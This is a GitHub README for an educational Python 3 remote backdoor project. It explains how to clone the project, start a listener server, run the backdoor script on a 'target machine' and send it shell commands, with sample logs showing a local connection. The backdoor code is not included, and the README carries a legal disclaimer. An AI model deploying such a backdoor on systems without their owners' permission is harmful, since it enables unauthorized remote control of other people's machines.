# Simple Backdoor in Python3

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT/)

A basic implementation of a backdoor in Python 3, designed for educational purposes or proof-of-concept demonstrations. This project should not be used for malicious activities.

Basically, `src/server.py` sends shell commands to the target machine or rather `src/backdoor.py` to execute them on the target machine.

## Dependencies

**Git** for cloning this repository into your machine. Here's [link](https://git-scm.com/downloads) to download it.

Both machines or rather server & client needs **Python 3.x** (Tested on Python 3.11)

### Optional dependencies

For colored logs, *coloredlogs* & *colorama* is required! Which to install them using **Pip**:

```bash
pip install -r requirements.txt
```

### Clone this repository

To run this files, you must clone this repository into your machine, or simply you can download repository by clicking [here](https://github.com/AshkanFeyzollahi/simple-backdoor/archive/refs/heads/main.zip)!

But to clone this repository, simply execute this command in a terminal (**Git** is required for this command):

```bash
git clone https://github.com/AshkanFeyzollahi/simple-backdoor.git
```

## Usage

After getting all dependencies and cloning/downloading this repository, open a terminal and go to repository folder:

```bash
cd simple-backdoor
```

### Server (listener) side

Run `src/server.py`:

```bash
python src/server.py
```

### Client (backdoor) side

Run `src/backdoor.py` on the target machine:

```bash
python src/backdoor.py
```

### Controlling the Backdoor

Once connected, you can execute shell commands by typing them into the server's console, followed by Enter. e.g. (Don't try at home):

#### Server side

```plain
2024-12-17 17:30:58 __main__[7708] INFO Initiating server
2024-12-17 17:30:58 __main__[7708] INFO Server initiated
2024-12-17 17:30:58 __main__[7708] INFO Awaiting client
2024-12-17 17:31:01 __main__[7708] INFO 127.0.0.1:62559 Connected to the server!
[127.0.0.1:62559] > echo Hello!
Hello!

[127.0.0.1:62559] >
```

#### Client side

```plain
2024-12-17 17:31:01 __main__[8296] INFO Initiating connection
2024-12-17 17:31:01 __main__[8296] INFO Connection initiated
2024-12-17 17:31:01 __main__[8296] INFO Awaiting command
2024-12-17 17:31:10 __main__[8296] INFO Creating a new process in order to run server command
2024-12-17 17:31:10 __main__[8296] INFO The sent command was ran on the device
Hello!

2024-12-17 17:31:10 __main__[8296] INFO Sending output of the sent server command
2024-12-17 17:31:10 __main__[8296] INFO Output sent
2024-12-17 17:31:10 __main__[8296] INFO Awaiting command
```

## Security Disclaimer

This project is for educational or demonstration purposes **ONLY**. Using this or any backdoor for unauthorized access to computer systems is **ILLEGAL** and unethical. Ensure you have explicit permission from system owners before running this software on their machines.
